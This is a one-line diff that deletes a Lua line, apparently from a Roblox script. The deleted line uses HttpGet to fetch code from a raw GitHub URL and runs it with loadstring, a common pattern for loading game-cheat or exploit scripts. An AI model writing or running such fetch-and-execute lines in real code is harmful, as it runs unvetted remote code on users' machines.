@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/LOLking123456/super1/main/strikers12"))()
